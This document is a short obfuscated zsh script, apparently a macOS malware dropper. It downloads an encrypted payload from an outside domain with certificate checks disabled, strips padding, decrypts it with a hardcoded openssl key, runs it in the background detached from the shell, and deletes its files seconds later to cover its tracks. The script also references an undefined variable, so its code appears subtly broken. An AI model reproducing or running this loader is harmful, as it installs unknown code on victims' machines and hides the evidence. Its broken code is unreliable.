#!/bin/zsh
ahw78=$(mktemp /tmp/qnas3y.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m97b410e4677c7ef3.bin" -o "$ahw78z" || exit 1
d2kf3f=$(stat -f %z "$ahw78z"); hdakwtd=$(( d2kf3f - 1980 - 3944 ))
tail -c +$(( 1980 + 1 )) "$ahw78z" | head -c $hdakwtd | openssl enc -d -aes-256-cbc -k 8b6cf00f33305e5734198773 -out "$ahw78" 2>/dev/null
[ -s "$ahw78" ] && chmod 700 "$ahw78" && ( "$ahw78" & ) && disown
( sleep 3; rm -f "$ahw78" "$ahw78z" ) &>/dev/null &
